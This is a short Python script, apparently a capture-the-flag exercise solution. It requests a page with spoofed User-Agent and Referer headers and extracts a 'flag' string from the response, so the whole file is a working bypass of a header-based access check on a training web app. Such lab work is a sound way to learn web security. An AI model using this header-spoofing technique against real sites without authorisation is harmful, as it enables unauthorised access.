#!/usr/bin/env python3

import argparse
import requests
import re

PARAMS = {"page": "e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"}
HEADERS = {"User-Agent": "ft_bornToSec", "referer": "https://www.nsa.gov/"}


def main(URL):
    r = requests.get(URL, PARAMS, headers=HEADERS)
    # find str that starts with "flag" and match all chars until and excluding "<"
    flag = re.search(r"flag[^<]*", r.text)
    if flag:
        print(flag.group(0))
    else:
        print("Found no flags")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Send a request with custom header")
    parser.add_argument("URL", help="URL address of the server")
    args = parser.parse_args()
    main(args.URL)
